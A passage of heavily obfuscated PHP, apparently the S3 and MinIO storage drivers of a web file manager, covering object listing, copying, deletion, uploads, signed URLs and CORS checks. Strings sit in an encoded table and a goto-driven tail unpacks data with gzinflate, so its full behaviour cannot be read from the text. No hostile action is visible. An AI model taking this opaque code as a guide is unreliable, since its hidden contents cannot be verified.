$ª‡–¤´Ã[8])); $şåø­‹¶ = 0; do { ++$şåø­‹¶; $üœ†ı¼[] = implode($ª‡–¤´Ã[8], array_slice($£ˆÚÍÛÓ, 0, $şåø­‹¶)) . $ª‡–¤´Ã[8]; } while ($şåø­‹¶ < count($£ˆÚÍÛÓ)); $üœ†ı¼[count($£ˆÚÍÛÓ) - 1] = $Ôİ©ûáÜ; return $üœ†ı¼; } public function getHost() { $­ÂÚßò¢ =& $_SERVER[şÒÁøÒÄ]; $Ã¾çâÕÜ = parse_url(trim($this->domain, $­ÂÚßò¢[8])); $¯Ğ‡ìÉâ = isset($Ã¾çâÕÜ[$­ÂÚßò¢[181]]) ? $Ã¾çâÕÜ[$­ÂÚßò¢[181]] : http_type(); $òÍĞŒ€í = isset($Ã¾çâÕÜ[$­ÂÚßò¢[182]]) ? $Ã¾çâÕÜ[$­ÂÚßò¢[182]] : $Ã¾çâÕÜ[$­ÂÚßò¢[84]]; if (isset($Ã¾çâÕÜ[$­ÂÚßò¢[183]])) { $òÍĞŒ€í .= $­ÂÚßò¢[4] . $Ã¾çâÕÜ[$­ÂÚßò¢[183]]; } return $¯Ğ‡ìÉâ . $­ÂÚßò¢[184] . $òÍĞŒ€í; } public function pathEncode($·¥İùŠ) { $‰ãÕ…´Û =& $_SERVER[şÒÁøÒÄ]; return str_replace($‰ãÕ…´Û[185], $‰ãÕ…´Û[8], rawurlencode($·¥İùŠ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($­¿¦ÌàÉ) { set_timeout(); require_once SDK_DIR . $_SERVER[şÒÁøÒÄ][186]; parent::__construct(); $this->_init($­¿¦ÌàÉ); } public function _init($È’ç¬) { $this->config = $È’ç¬; foreach ($È’ç¬ as $³Ú²†¤Ä => $İÂ»ßú†) { if (isset($this->{$³Ú²†¤Ä})) { $this->{$³Ú²†¤Ä} = $İÂ»ßú†; } } $this->endpoint = $È’ç¬[$_SERVER[şÒÁøÒÄ][187]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ĞœÎ†›î = "\x76\x34") { $this->signVer = $ĞœÎ†›î; $this->client->setSignatureVersion($ĞœÎ†›î); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $¥ÊÒÑ±ş =& $_SERVER[şÒÁøÒÄ]; $Í–Ö§÷“ = $this->getBucketCors(); if (!$Í–Ö§÷“ || !is_array($Í–Ö§÷“)) { return !1; } if ($Í–Ö§÷“[$¥ÊÒÑ±ş[188]] != $¥ÊÒÑ±ş[189] || $Í–Ö§÷“[$¥ÊÒÑ±ş[190]] != $¥ÊÒÑ±ş[189]) { return !1; } $åä¨©ˆÇ = array_map($¥ÊÒÑ±ş[191], $Í–Ö§÷“[$¥ÊÒÑ±ş[192]]); if (!is_array($åä¨©ˆÇ)) { $åä¨©ˆÇ = array(); } $„¶¯ŸÓË = array($¥ÊÒÑ±ş[193], $¥ÊÒÑ±ş[194], $¥ÊÒÑ±ş[195], $¥ÊÒÑ±ş[196], $¥ÊÒÑ±ş[197]); $¡É—ß§¾ = array_diff($„¶¯ŸÓË, $åä¨©ˆÇ); return empty($¡É—ß§¾); } public function mkfile($ ²ÑÆ…Ê, $¬õÌÜã = '', $‘ âÀîº = REPEAT_RENAME) { $“ÇÎòÌ = $this->setContent($ ²ÑÆ…Ê, $¬õÌÜã); if ($“ÇÎòÌ !== !1) { return $this->getPathOuter($ ²ÑÆ…Ê); } return !1; } public function mkdir($å¢èâ®¨, $’¢ê‰¥ = REPEAT_SKIP) { $î‘ş¨À =& $_SERVER[şÒÁøÒÄ]; if (empty($å¢èâ®¨) && $å¢èâ®¨ !== $î‘ş¨À[198]) { return !1; } if ($’¢ê‰¥ && $this->_isFolder($å¢èâ®¨)) { return $this->getPathOuter($å¢èâ®¨); } $´¾²´· = $this->setContent($å¢èâ®¨, $î‘ş¨À[12], !0); if ($´¾²´· !== !1) { return $this->getPathOuter($å¢èâ®¨); } return !1; } public function copyFile($İû›ÌÖÛ, $İ¡ş¶ÏÎ, $´øè±å¦ = array()) { $‚°£¿ò‡ =& $_SERVER[şÒÁøÒÄ]; $•û¼ü°ğ = $this->objectMeta($İû›ÌÖÛ); if (!$•û¼ü°ğ) { return !1; } if ($•û¼ü°ğ[$‚°£¿ò‡[76]] <= 1024 * 1024 * 200) { $Üàç“ Ó = $this->client->copyObject($this->bucket, $İû›ÌÖÛ, $this->bucket, $İ¡ş¶ÏÎ, $‚°£¿ò‡[199], $´øè±å¦); } else { $Üàç“ Ó = $this->client->multiCopyObject($this->bucket, $İû›ÌÖÛ, $this->bucket, $İ¡ş¶ÏÎ, $´øè±å¦); } $Üàç“ Ó = $Üàç“ Ó ? $this->getPathOuter($İ¡ş¶ÏÎ) : !1; return $Üàç“ Ó; } public function moveFile($®¼àĞ¨´, $Ôô¨±íì) { if ($this->copyFile($®¼àĞ¨´, $Ôô¨±íì)) { $this->delFile($®¼àĞ¨´); return $this->getPathOuter($Ôô¨±íì); } return !1; } public function delFile($ËÇ²º³) { return $this->client->deleteObject($this->bucket, $ËÇ²º³); } public function delFolder($‘öêŸ¨…) { $¡ü›±¸¼ =& $_SERVER[şÒÁøÒÄ]; if (!$this->exist($‘öêŸ¨…)) { return !0; } $this->listItemCache = !1; $Á¥£ó = $this->fileList($‘öêŸ¨…); $this->listItemCache = !0; $¢†²Öı = trim($‘öêŸ¨…, $¡ü›±¸¼[8]) . $¡ü›±¸¼[8]; if (!empty($‘öêŸ¨…) && $‘öêŸ¨… !== $¡ü›±¸¼[198] && !in_array($¢†²Öı, $Á¥£ó[$¡ü›±¸¼[82]])) { $Á¥£ó[$¡ü›±¸¼[82]][] = $¢†²Öı; } $Ö«‹‡ù = $this->delByBatch($Á¥£ó[$¡ü›±¸¼[83]]); if (!$Ö«‹‡ù) { return !1; } $Ö«‹‡ù = $this->delByBatch($Á¥£ó[$¡ü›±¸¼[82]]); if (!$Ö«‹‡ù) { return !1; } return $this->delFile($¢†²Öı); } private function delByBatch($Óâõ±„) { foreach (array_chunk($Óâõ±„, 1000) as $ËªşÉâ) { $´Ñ¢›¦ = $this->client->deleteObjects($this->bucket, $ËªşÉâ); if (!$´Ñ¢›¦) { return !1; } } return !0; } public function rename($Ÿå…Êìø, $üµ«˜©) { return $this->renameObject($Ÿå…Êìø, $üµ«˜©); } public function listPath($úĞÊØ§”, $†Ò£¼¤Ö = false) { $¿ÙôŞãÕ =& $_SERVER[şÒÁøÒÄ]; $û¯Ó†ô = $this->fileList($úĞÊØ§”, $¿ÙôŞãÕ[8], !0); foreach ($û¯Ó†ô[$¿ÙôŞãÕ[82]] as $ƒÅÌá±Ñ => $á¼Á¨å¯) { $û¯Ó†ô[$¿ÙôŞãÕ[82]][$ƒÅÌá±Ñ] = $this->folderInfo($á¼Á¨å¯, $†Ò£¼¤Ö, $á¼Á¨å¯); } foreach ($û¯Ó†ô[$¿ÙôŞãÕ[83]] as $ƒÅÌá±Ñ => $á¼Á¨å¯) { $û¯Ó†ô[$¿ÙôŞãÕ[83]][$ƒÅÌá±Ñ] = $this->fileInfo($á¼Á¨å¯[$¿ÙôŞãÕ[32]], $†Ò£¼¤Ö, $á¼Á¨å¯); } return $û¯Ó†ô; } protected function infoChildren($âéšµõ¬, &$•Ğ¬ƒ¸¡) { $•Ê˜ò… =& $_SERVER[şÒÁøÒÄ]; $ğÀ‘õØû = $this->fileList($âéšµõ¬, $•Ê˜ò…[12], !0); $•Ğ¬ƒ¸¡[$•Ê˜ò…[78]] += count($ğÀ‘õØû[$•Ê˜ò…[82]]); $•Ğ¬ƒ¸¡[$•Ê˜ò…[77]] += count($ğÀ‘õØû[$•Ê˜ò…[83]]); foreach ($ğÀ‘õØû[$•Ê˜ò…[83]] as $ú•·´üë) { if (!$ú•·´üë || !$ú•·´üë[$•Ê˜ò…[76]]) { continue; } $•Ğ¬ƒ¸¡[$•Ê˜ò…[76]] += $ú•·´üë[$•Ê˜ò…[76]]; } } private function fileInfo($Û½ÏÎ¦, $Ö€¶·• = false, $–Ìæˆ‹á = array()) { $ÑÉƒ» =& $_SERVER[şÒÁøÒÄ]; $ §À´‹´ = array($ÑÉƒ»[32] => $this->pathThis($Û½ÏÎ¦), $ÑÉƒ»[84] => $this->getPathOuter($Û½ÏÎ¦), $ÑÉƒ»[33] => $ÑÉƒ»[200], $ÑÉƒ»[174] => $this->ext($Û½ÏÎ¦), $ÑÉƒ»[76] => isset($–Ìæˆ‹á[$ÑÉƒ»[76]]) ? $–Ìæˆ‹á[$ÑÉƒ»[76]] : 0); if ($Ö€¶·•) { return $ §À´‹´; } $ §À´‹´[$ÑÉƒ»[201]] = $ §À´‹´[$ÑÉƒ»[85]] = 0; $ §À´‹´[$ÑÉƒ»[202]] = $ §À´‹´[$ÑÉƒ»[203]] = !0; if (empty($–Ìæˆ‹á)) { $–Ìæˆ‹á = $this->objectMeta($Û½ÏÎ¦); if (!$–Ìæˆ‹á) { return $ §À´‹´; } } if (isset($–Ìæˆ‹á[$ÑÉƒ»[180]])) { $ §À´‹´[$ÑÉƒ»[85]] = $–Ìæˆ‹á[$ÑÉƒ»[180]]; } if (isset($–Ìæˆ‹á[$ÑÉƒ»[76]])) { $ §À´‹´[$ÑÉƒ»[76]] = $–Ìæˆ‹á[$ÑÉƒ»[76]]; } return $ §À´‹´; } private function folderInfo($÷åå×îá, $µô…à…Â = false, $µÖÇ¬ ´ = array()) { $ô§ó€í› =& $_SERVER[şÒÁøÒÄ]; $Í±¨û“ = array($ô§ó€í›[32] => $this->pathThis($÷åå×îá), $ô§ó€í›[84] => $this->getPathOuter($ô§ó€í›[8] . $÷åå×îá), $ô§ó€í›[33] => $ô§ó€í›[75]); if ($µô…à…Â) { return $Í±¨û“; } $Í±¨û“[$ô§ó€í›[201]] = $Í±¨û“[$ô§ó€í›[85]] = 0; $Í±¨û“[$ô§ó€í›[202]] = $Í±¨û“[$ô§ó€í›[203]] = !0; if ($÷åå×îá == $ô§ó€í›[12]) { return $Í±¨û“; } if (empty($µÖÇ¬ ´)) { $µÖÇ¬ ´ = $this->objectMeta(trim($÷åå×îá, $ô§ó€í›[8]) . $ô§ó€í›[8]); } if (isset($µÖÇ¬ ´[$ô§ó€í›[180]])) { $Í±¨û“[$ô§ó€í›[201]] = $µÖÇ¬ ´[$ô§ó€í›[180]]; } return $Í±¨û“; } private function fileList($¼¶ÜàŒÎ, $šÏúöÏ = '', $—¬Ô¢Ÿ‰ = 0) { $¿«©áßş =& $_SERVER[şÒÁøÒÄ]; $éõàöá = rtrim($¼¶ÜàŒÎ, $¿«©áßş[8]) . $¿«©áßş[8]; $À¡À…§Ü = $this->listObjs($éõàöá, null, null, $šÏúöÏ); if (!$À¡À…§Ü) { return array($¿«©áßş[82] => array(), $¿«©áßş[83] => array()); } $Â´ˆî“Ó = $æâ­ıÚƒ = array(); foreach ($À¡À…§Ü[$¿«©áßş[204]] as $”‰êü—Ü) { $åÓ‘ûæ‰ = $”‰êü—Ü[$¿«©áßş[32]]; if ($åÓ‘ûæ‰ == $éõàöá) { continue; } $±“è‘¼¿ = isset($”‰êü—Ü[$¿«©áßş[76]]) ? $”‰êü—Ü[$¿«©áßş[76]] : 0; $ÄÂ¥úƒ˜ = $±“è‘¼¿ == 0 && substr($åÓ‘ûæ‰, strlen($åÓ‘ûæ‰) - 1, 1) == $¿«©áßş[8] ? !0 : !1; $this->cacheMethodInfoSet($åÓ‘ûæ‰, $ÄÂ¥úƒ˜, $”‰êü—Ü); if ($ÄÂ¥úƒ˜) { $Â´ˆî“Ó[] = $åÓ‘ûæ‰; continue; } $æâ­ıÚƒ[] = $—¬Ô¢Ÿ‰ ? $”‰êü—Ü : $åÓ‘ûæ‰; } foreach ($À¡À…§Ü[$¿«©áßş[205]] as $”‰êü—Ü) { $Â´ˆî“Ó[] = $”‰êü—Ü[$¿«©áßş[32]]; $this->cacheMethodInfoSet($”‰êü—Ü[$¿«©áßş[32]], !0); } $this->cacheMethodInfoSet($¼¶ÜàŒÎ, !0); return array($¿«©áßş[82] => $Â´ˆî“Ó, $¿«©áßş[83] => $æâ­ıÚƒ); } private function listObjs($¬É§ªö—, $é•ìµİÑ = null, $¼©²’Şì = null, $ğóÚ±„ = null) { $°®³ÀŞ =& $_SERVER[şÒÁøÒÄ]; $¬É§ªö— = trim($¬É§ªö—, $°®³ÀŞ[8]); $í•’É‹ó = empty($¬É§ªö—) && $¬É§ªö— !== $°®³ÀŞ[198] ? $°®³ÀŞ[12] : $¬É§ªö— . $°®³ÀŞ[8]; return $this->client->getBucket($this->bucket, $í•’É‹ó, $é•ìµİÑ, $¼©²’Şì, $ğóÚ±„, !0); } public function has($ƒÒˆ‹¦˜, $âû•©£ë = false, $ıŒ—Ô«„ = true) { $ßı¤ ª• =& $_SERVER[şÒÁøÒÄ]; $ƒÒˆ‹¦˜ = trim($ƒÒˆ‹¦˜, $ßı¤ ª•[8]); $¸ÖÃêÚÉ = empty($ƒÒˆ‹¦˜) && $ƒÒˆ‹¦˜ !== $ßı¤ ª•[198] ? $ßı¤ ª•[12] : $ƒÒˆ‹¦˜ . $ßı¤ ª•[8]; $ë³Ÿäœ  = null; $øù¦¾Ç = 500; $ÉÇ–±° = $ßı¤ ª•[8]; $Ñ§ˆñ®Î = $¤ÈîŞùë = array(); while (!0) { $×æ©Éø§ = $this->listObjs($ƒÒˆ‹¦˜, $ë³Ÿäœ , $øù¦¾Ç, $ÉÇ–±°); if (!$×æ©Éø§) { break; } $ë³Ÿäœ  = $×æ©Éø§[$ßı¤ ª•[206]]; $ ½ÈÑ¶÷ = $×æ©Éø§[$ßı¤ ª•[204]]; $¿ÑÛÀ‡Ü = $×æ©Éø§[$ßı¤ ª•[205]]; if (empty($ ½ÈÑ¶÷) && empty($¿ÑÛÀ‡Ü)) { break; } if (count($ ½ÈÑ¶÷) == 1 && $ ½ÈÑ¶÷[0][$ßı¤ ª•[32]] == $¸ÖÃêÚÉ) { break; } if ($âû•©£ë) { if (count($ ½ÈÑ¶÷)) { $ ½ÈÑ¶÷ = array_column($ ½ÈÑ¶÷, $ßı¤ ª•[32]); $Ñ§ˆñ®Î = array_merge($Ñ§ˆñ®Î, $ ½ÈÑ¶÷); } if (count($¿ÑÛÀ‡Ü)) { $¿ÑÛÀ‡Ü = array_column($¿ÑÛÀ‡Ü, $ßı¤ ª•[32]); $¤ÈîŞùë = array_merge($¤ÈîŞùë, $¿ÑÛÀ‡Ü); } if ($ë³Ÿäœ  === null) { break; } continue; } if ($ıŒ—Ô«„) { if (!empty($ ½ÈÑ¶÷)) { if (count($ ½ÈÑ¶÷) > 1 || isset($ ½ÈÑ¶÷[0][$ßı¤ ª•[32]]) && $ ½ÈÑ¶÷[0][$ßı¤ ª•[32]] != $¸ÖÃêÚÉ) { return !0; } } } else { if (!empty($¿ÑÛÀ‡Ü)) { return !0; } } if ($ë³Ÿäœ  === null) { break; } } if ($âû•©£ë) { $Ñ§ˆñ®Î = array_diff($Ñ§ˆñ®Î, array($¸ÖÃêÚÉ)); $Ñ§ˆñ®Î = count(array_unique($Ñ§ˆñ®Î)); $¤ÈîŞùë = count(array_unique($¤ÈîŞùë)); return array($ßı¤ ª•[207] => $Ñ§ˆñ®Î, $ßı¤ ª•[208] => $¤ÈîŞùë); } return !1; } public function listAll($…â‹‘œà) { $ÉòğÅ¼¬ =& $_SERVER[şÒÁøÒÄ]; $ñî¦ëêÅ = $this->fileList($…â‹‘œà, $ÉòğÅ¼¬[12], !0); $Æ…‚àïÉ = array_to_keyvalue($ñî¦ëêÅ[$ÉòğÅ¼¬[83]], $ÉòğÅ¼¬[32]); foreach ($ñî¦ëêÅ[$ÉòğÅ¼¬[82]] as $–ğ£Ï) { if (is_string($–ğ£Ï)) { $Æ…‚àïÉ[$–ğ£Ï] = array($ÉòğÅ¼¬[76] => 0); } } return $this->listAllFiles($…â‹‘œà, $Æ…‚àïÉ); } public function canRead($Êğàî¿§) { $­ÜèÚ»« =& $_SERVER[şÒÁøÒÄ]; $ø·ÈŸÕÆ = $this->client->getAccessControlPolicy($this->bucket, $Êğàî¿§); if (!$ø·ÈŸÕÆ) { return !1; } return in_array($ø·ÈŸÕÆ, array($­ÜèÚ»«[209], $­ÜèÚ»«[210], $­ÜèÚ»«[211])) ? !0 : !1; } public function canWrite($‹÷×Ş¦) { $øß”Ñ =& $_SERVER[şÒÁøÒÄ]; $ÜÖë£«ò = $this->client->getAccessControlPolicy($this->bucket, $‹÷×Ş¦); if (!$ÜÖë£«ò) { return !1; } return in_array($ÜÖë£«ò, array($øß”Ñ[209], $øß”Ñ[210])) ? !0 : !1; } public function getContent($Ï ä×Ó›) { return $this->client->getObject($this->bucket, $Ï ä×Ó›); } public function setContent($¥ÖöñÎ, $¤÷¨Ûš¹ = '', $ıçÂıûï = false) { $¤¼œ®œ =& $_SERVER[şÒÁøÒÄ]; $¥ÖöñÎ = $ıçÂıûï ? trim($¥ÖöñÎ, $¤¼œ®œ[8]) . $¤¼œ®œ[8] : $¥ÖöñÎ; $€–°´Ãâ = get_file_mime(get_path_ext($¥ÖöñÎ)); $¯Òøƒ²Í = $this->client->putObject($¤÷¨Ûš¹, $this->bucket, $¥ÖöñÎ, $¤¼œ®œ[199], array(), $€–°´Ãâ); if (!$¯Òøƒ²Í) { return !1; } if ($ıçÂıûï) { return !0; } $this->cacheMethod(null, null); $¯Òøƒ²Í = $this->copyFile($¥ÖöñÎ, $¥ÖöñÎ, array($¤¼œ®œ[212] => $¯Òøƒ²Í[$¤¼œ®œ[213]])); return $¯Òøƒ²Í ? !0 : !1; } public function fileSubstr($±²ÌÇèÜ, $›¤æ’, $Ïû³Èíˆ) { $é²Õ¦»ç = $›¤æ’ + $Ïû³Èíˆ - 1; return $this->client->getObject($this->bucket, $±²ÌÇèÜ, array($_SERVER[şÒÁøÒÄ][214] => "\142\171\x74\145\x73\x3d{$›¤æ’}\x2d{$é²Õ¦»ç}")); } public function upload($¨¬èÖÄ, $‚Ò™ıÆ¸, $šö¿ÌÌª = false, $áæÖğ•» = REPEAT_REPLACE) { $½Ñâ±ó =& $_SERVER[şÒÁøÒÄ]; $ş™ÇÓ‰¾ = array($½Ñâ±ó[212] => @md5_file($‚Ò™ıÆ¸)); $«¡¶ù = array($½Ñâ±ó[215] => get_file_mime(get_path_ext($¨¬èÖÄ))); if (IO::size($‚Ò™ıÆ¸) <= 1024 * 1024 * 200) { $’áÉĞ®À = $this->client->putObjectFile($‚Ò™ıÆ¸, $this->bucket, $¨¬èÖÄ, $½Ñâ±ó[199], $ş™ÇÓ‰¾, $«¡¶ù); return !empty($’áÉĞ®À) ? $this->getPathOuter($¨¬èÖÄ) : !1; } $ª÷¬ÜÏ = $this->client->multiUploadObject($‚Ò™ıÆ¸, $this->bucket, trim($¨¬èÖÄ, $½Ñâ±ó[8]), $ş™ÇÓ‰¾, $«¡¶ù); return $ª÷¬ÜÏ ? $this->getPathOuter($¨¬èÖÄ) : !1; } public function download($Ÿ»èŒ¡, $ †Æøì×) { if (!@is_dir($this->pathFather($ †Æøì×)) && !IO::mkdir($this->pathFather($ †Æøì×))) { return !1; } $éôç¶ñ‰ = $this->client->getObject($this->bucket, $Ÿ»èŒ¡, array(), $ †Æøì×); return $éôç¶ñ‰ !== !1 ? $ †Æøì× : !1; } public function link($ÄÀ–¸‹ˆ, $Ÿ©öç‘Ë = array()) { $ë˜öõ«Ç =& $_SERVER[şÒÁøÒÄ]; if ($this->signVer == $ë˜öõ«Ç[216]) { return $this->client->getAuthenticatedURL($this->bucket, $ÄÀ–¸‹ˆ, 3600 * 12, $Ÿ©öç‘Ë); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ÄÀ–¸‹ˆ, $ë˜öõ«Ç[8]), 3600 * 12, $this->region, array(), !0, $Ÿ©öç‘Ë); } public function fileOut($‰£û‰€Í, $²°ÜåáÛ = false, $ìõÂˆŠ³ = false, $âÁ²ÜÓ = '') { $»àÙç– =& $_SERVER[şÒÁøÒÄ]; if ($this->isFileOutServer()) { return $this->fileOutServer($‰£û‰€Í, $²°ÜåáÛ, $ìõÂˆŠ³, $âÁ²ÜÓ); } if (!$ìõÂˆŠ³) { $ìõÂˆŠ³ = $this->pathThis($‰£û‰€Í); } $¾ÔÉõ±ø = get_file_mime(get_path_ext($ìõÂˆŠ³)); if ($¾ÔÉõ±ø == $»àÙç–[217]) { return parent::fileOut($‰£û‰€Í, $²°ÜåáÛ, $ìõÂˆŠ³, $âÁ²ÜÓ); } $÷Ô§ıŠê = array($»àÙç–[218] => $¾ÔÉõ±ø); if ($²°ÜåáÛ) { $÷Ô§ıŠê[$»àÙç–[219]] = $»àÙç–[220] . rawurlencode($ìõÂˆŠ³); } else { } $–Ÿ²¯¨œ = $this->link($‰£û‰€Í, $÷Ô§ıŠê); $this->fileOutLink($–Ÿ²¯¨œ); } public function fileOutServer($»ÖŠàŒ, $³ãßŞ†“ = false, $…·¦øÊš = false, $—Ôº¾° = '') { parent::fileOut($»ÖŠàŒ, $³ãßŞ†“, $…·¦øÊš, $—Ôº¾°); } public function fileOutImageServer($ÏÏŞò¨ì, $Õ“ıü® = 250) { parent::fileOutImage($ÏÏŞò¨ì, $Õ“ıü®); } public function hashMd5($—ùš¯Ò¶, $ÊÙñÚİ = '') { $´‰½£éÅ =& $_SERVER[şÒÁøÒÄ]; $²úåÙĞŞ = $this->objectMeta($—ùš¯Ò¶); if (!$²úåÙĞŞ) { return !1; } $ÊÙñÚİ = $ÊÙñÚİ ? $ÊÙñÚİ : _get($²úåÙĞŞ, $´‰½£éÅ[221]); $ÊÙñÚİ = $ÊÙñÚİ ? $ÊÙñÚİ : _get($²úåÙĞŞ, $´‰½£éÅ[213], $´‰½£éÅ[12]); return $ÊÙñÚİ; } public function uploadFormData($öŒ¿ÛÜã, $âı ï÷’ = 3600) { $»·¯‹â =& $_SERVER[şÒÁøÒÄ]; $ı²… ñ« = $this->pathFather($öŒ¿ÛÜã); $¥ß©†” = $this->client->getHttpUploadPostParams($this->bucket, $ı²… ñ«, $»·¯‹â[199], $âı ï÷’); return array_merge((array) $¥ß©†”, array($»·¯‹â[182] => $this->getHost())); } public function multiUploadFormData($¹½ú‰èá, $¥û†Èâ = 3600) { $öĞ›˜›” =& $_SERVER[şÒÁøÒÄ]; $À€â­Í· = gmdate($öĞ›˜›”[222]); $Ä„ĞË–Ü = array(); $®ó÷ñ¹ = $this->client->getUploadId($this->bucket, $¹½ú‰èá, $Ä„ĞË–Ü); if (!$®ó÷ñ¹) { return !1; } return array($öĞ›˜›”[223] => $®ó÷ñ¹, $öĞ›˜›”[182] => $this->getHost() . $öĞ›˜›”[8] . $this->pathEncode($¹½ú‰èá), $öĞ›˜›”[224] => $À€â­Í·, $öĞ›˜›”[94] => $¹½ú‰èá); } public function multiUploadAuthData($àÌ²«µ, $´—‹²æĞ = array()) { $ıÜÚÆ ¶ =& $_SERVER[şÒÁøÒÄ]; $ ‘½Òû™ = isset($´—‹²æĞ[$ıÜÚÆ ¶[224]]) ? $´—‹²æĞ[$ıÜÚÆ ¶[224]] : gmdate($ıÜÚÆ ¶[222]); $ªùçáú = isset($´—‹²æĞ[$ıÜÚÆ ¶[174]]) ? $´—‹²æĞ[$ıÜÚÆ ¶[174]] : $ıÜÚÆ ¶[12]; $‚ŠÔŞ÷¥ = $´—‹²æĞ[$ıÜÚÆ ¶[94]]; unset($´—‹²æĞ[$ıÜÚÆ ¶[94]]); if (isset($´—‹²æĞ[$ıÜÚÆ ¶[225]])) { $´—‹²æĞ[$ıÜÚÆ ¶[224]] = $ ‘½Òû™; return $this->listUploadParts($‚ŠÔŞ÷¥, $´—‹²æĞ); } $²¹¦à½Ş = array($ıÜÚÆ ¶[226], $ıÜÚÆ ¶[12], $ıÜÚÆ ¶[120], $ıÜÚÆ ¶[12], "\x78\x2d\x61\155\x7a\x2d\x64\141\x74\145\72{$ ‘½Òû™}", $ıÜÚÆ ¶[8] . $this->bucket . $ıÜÚÆ ¶[8] . $this->pathEncode($‚ŠÔŞ÷¥) . $ªùçáú); if (strpos($ªùçáú, $ıÜÚÆ ¶[227]) === 0) { $²¹¦à½Ş[0] = $ıÜÚÆ ¶[228]; } if (isset($´—‹²æĞ[$ıÜÚÆ ¶[229]]) && $´—‹²æĞ[$ıÜÚÆ ¶[229]] == $ıÜÚÆ ¶[230]) { $²¹¦à½Ş[0] = $ıÜÚÆ ¶[230]; } $·şŒ¸² = implode($ıÜÚÆ ¶[231], $²¹¦à½Ş); $ã¦Æ = base64_encode(hash_hmac($ıÜÚÆ ¶[232], $·şŒ¸², $this->secret, !0)); $Ø×õË = $ıÜÚÆ ¶[233] . $this->accessKey . $ıÜÚÆ ¶[4] . $ã¦Æ; if (strpos($ªùçáú, $ıÜÚÆ ¶[227]) === 0) { return array($ıÜÚÆ ¶[234] => $Ø×õË, $ıÜÚÆ ¶[224] => $ ‘½Òû™); } return $Ø×õË; } public function listUploadParts($ûñ¿®œÕ, $û©‘¼Ä¼ = array()) { $ó¨¡ËÍ =& $_SERVER[şÒÁøÒÄ]; $¹ñÎèÕÍ = str_replace($ó¨¡ËÍ[235], $ó¨¡ËÍ[12], $û©‘¼Ä¼[$ó¨¡ËÍ[174]]); $‘¨Ãà‰È = $this->client->listParts($this->bucket, $ûñ¿®œÕ, $¹ñÎèÕÍ); if (!$‘¨Ãà‰È) { return !1; } unset($û©‘¼Ä¼[$ó¨¡ËÍ[225]], $û©‘¼Ä¼[$ó¨¡ËÍ[229]]); $û©‘¼Ä¼[$ó¨¡ËÍ[94]] = $ûñ¿®œÕ; $ÇÏ‘àšº = $this->multiUploadAuthData($ûñ¿®œÕ, $û©‘¼Ä¼); if (empty($ÇÏ‘àšº)) { return !1; } return array($ó¨¡ËÍ[234] => $ÇÏ‘àšº, $ó¨¡ËÍ[224] => $û©‘¼Ä¼[$ó¨¡ËÍ[224]], $ó¨¡ËÍ[236] => $‘¨Ãà‰È); } public function getHost() { return parent::getHost() . $_SERVER[şÒÁøÒÄ][8] . $this->bucket; } public function size($Ò‰ú¶ù) { $­‡´¤Î = $this->objectMeta($Ò‰ú¶ù); return $­‡´¤Î ? $­‡´¤Î[$_SERVER[şÒÁøÒÄ][76]] : 0; } public function info($ÅÁğÄ¸ı) { if ($this->isFolder($ÅÁğÄ¸ı)) { return $this->folderInfo($ÅÁğÄ¸ı); } else { if ($this->isFile($ÅÁğÄ¸ı)) { return $this->fileInfo($ÅÁğÄ¸ı); } } return !1; } public function exist($Ã‘ñı¹õ) { return $this->isFile($Ã‘ñı¹õ) || $this->isFolder($Ã‘ñı¹õ); } public function isFile($ïŒğıœ„) { return !$this->isFolder($ïŒğıœ„) && $this->objectMeta($ïŒğıœ„); } public function isFolder($âÖ¿íÏÁ) { return $this->cacheMethod($_SERVER[şÒÁøÒÄ][165], $âÖ¿íÏÁ); } protected function objectMeta($İÁ©ç ñ) { return $this->cacheMethod($_SERVER[şÒÁøÒÄ][167], $İÁ©ç ñ); } protected function _objectMeta($ô”ŠêÅË) { $éÔ®é‰ë =& $_SERVER[şÒÁøÒÄ]; $ô”ŠêÅË = rtrim($ô”ŠêÅË, $éÔ®é‰ë[8]); try { $ñĞÂ³ Ò = $this->client->getObjectInfo($this->bucket, $ô”ŠêÅË); if (!isset($ñĞÂ³ Ò[$éÔ®é‰ë[221]]) && isset($ñĞÂ³ Ò[$éÔ®é‰ë[237]])) { $ñĞÂ³ Ò[$éÔ®é‰ë[221]] = $ñĞÂ³ Ò[$éÔ®é‰ë[237]]; } } catch (Exception $Ü›ıÍù‹) { $ñĞÂ³ Ò = !1; } if (!$ñĞÂ³ Ò) { } return $ñĞÂ³ Ò; } protected function _isFolder($ïÑİÓúî) { $öŠÇàã =& $_SERVER[şÒÁøÒÄ]; $ïÑİÓúî = rtrim($ïÑİÓúî, $öŠÇàã[8]); if ($ïÑİÓúî == $öŠÇàã[12] || $ïÑİÓúî == $öŠÇàã[8]) { return !0; } $ÀÖ¥ğ » = $this->client->getBucket($this->bucket, $ïÑİÓúî, null, 1); if (empty($ÀÖ¥ğ »[$öŠÇàã[204]])) { return !1; } $óğÖ÷Š† = $ÀÖ¥ğ »[$öŠÇàã[204]][0][$öŠÇàã[32]]; return stripos($óğÖ÷Š†, $ïÑİÓúî . $öŠÇàã[8]) === 0 ? !0 : !1; if (substr($óğÖ÷Š†, -1) == $öŠÇàã[8]) { return !0; } if (get_path_this($óğÖ÷Š†) == get_path_this($ïÑİÓúî)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Îø¶Â“ş) { parent::__construct($Îø¶Â“ş); $this->signatureVersion($_SERVER[şÒÁøÒÄ][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto f¨ÛëËÇÊâ; A÷Ÿï¸–¡: define($_SERVER[şÒÁøÒÄ][604], $_SERVER[şÒÁøÒÄ][605]); $pamkwqobsy = $_SERVER[şÒÁøÒÄ][606]; $_SERVER[°ÖÎï] = explode($_SERVER[şÒÁøÒÄ][607], gzinflate(substr($_SERVER[şÒÁøÒÄ][608], 10, -8))); goto Dœ®÷çÌ†¼; AÏÑê®âñ“: class CacheLockMemcached { public function lock($Ğéª’¥Â, $çƒã‚¡é = 0) { 